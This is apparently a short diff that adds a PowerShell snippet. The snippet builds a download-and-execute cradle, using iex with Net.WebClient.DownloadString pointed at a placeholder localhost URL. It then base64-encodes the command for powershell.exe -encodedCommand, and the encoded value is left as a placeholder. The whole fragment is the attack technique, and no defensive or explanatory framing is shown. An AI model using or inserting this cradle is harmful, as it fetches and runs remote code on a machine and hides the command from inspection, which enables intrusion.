@@ -1,0 +1,5 @@
+$command = "iex (New-Object Net.WebClient).DownloadString('https://localhost/1.txt') ; iex "
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+
+powershell.exe -encodedCommand <EncodedCommand>
